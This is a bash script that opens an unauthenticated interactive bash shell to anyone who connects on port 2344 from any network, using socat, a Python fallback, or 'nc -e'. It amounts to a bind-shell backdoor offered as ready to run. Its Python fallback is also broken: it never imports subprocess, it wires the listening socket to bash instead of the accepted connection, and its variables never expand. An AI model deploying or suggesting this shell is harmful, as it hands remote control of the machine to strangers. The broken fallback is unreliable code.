#!/bin/bash

# Configuration
PORT=2344
INTERFACE="0.0.0.0"  # "0.0.0.0" = Listen on All Interfaces (Local + External)
PROTOCOL="TCP"

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo -e "${GREEN}=== Unauthenticated Telnet/Shell Server Setup ===${NC}"
echo "Binding to: ${INTERFACE}:${PORT}"
echo "Mode: ${INTERFACE} (Local and External Accessable)"
echo ""

# Function to check if a process is listening on the port
check_port() {
    if command -v ss &> /dev/null; then
        ss -tlnp | grep ":${PORT}"
    elif command -v netstat &> /dev/null; then
        netstat -tlnp | grep ":${PORT}"
    fi
}

# Check if port is already in use
if [ $(check_port | wc -l) -gt 0 ]; then
    echo -e "${RED}Warning: Port ${PORT} is already in use!${NC}"
    read -p "Do you want to kill existing process and restart? (y/n) " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        if command -v ss &> /dev/null; then
            pkill -f "${PORT}" 2>/dev/null
        else
            pkill -f "${PORT}" 2>/dev/null || true
        fi
        sleep 1
    else
        exit 1
    fi
fi

# Check for preferred tools
if command -v socat &> /dev/null; then
    echo -e "${YELLOW}Detected ${GREEN}socat${YELLOW} (Best Performance for Shells)${NC}"
    # socat with fork allows multiple simultaneous connections
    # EXEC:bash -i spawns an interactive shell
    socat -T 0 TCP-LISTEN:${PORT},reuse,fork EXEC:bash -i,pty
elif command -v python3 &> /dev/null; then
    echo -e "${YELLOW}Detected ${GREEN}python3${YELLOW} (Fallback Mode)${NC}"
    python3 << 'PYTHON_EOF'
import socket
import os
import sys

HOST = '${INTERFACE}'
PORT = ${PORT}

print(f"Python Telnet Server starting on {HOST}:{PORT} (Local + External)...")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((HOST, PORT))
sock.listen(5)
print(f"Listening on socket. Hit Ctrl+C to stop.")

while True:
    try:
        conn, addr = sock.accept()
        print(f"Accepted connection from {addr}")
        
        # Start an interactive bash shell on the server side
        # This pipes the TCP stream directly to stdin/stdout of bash
        try:
            cmd = subprocess.Popen(['bash', '-i'], stdin=sock, stdout=sock, stderr=sock)
            cmd.wait()
        except Exception as e:
            print(f"Shell subprocess error: {e}")
            conn.close()
    except KeyboardInterrupt:
        print("\nShutting down gracefully...")
        break
    except Exception as e:
        print(f"Connection error: {e}")
        break
PYTHON_EOF
elif command -v nc &> /dev/null; then
    echo -e "${YELLOW}Detected ${GREEN}nc${YELLOW} (Netcat Fallback)${NC}"
    # Using GNU Netcat flags, -k ensures keep listening after disconnect
    nc -l -p ${PORT} -k -e bash -i
else
    echo -e "${RED}Error: No suitable server found (Try installing python3 or netcat)${NC}"
    exit 1
fi
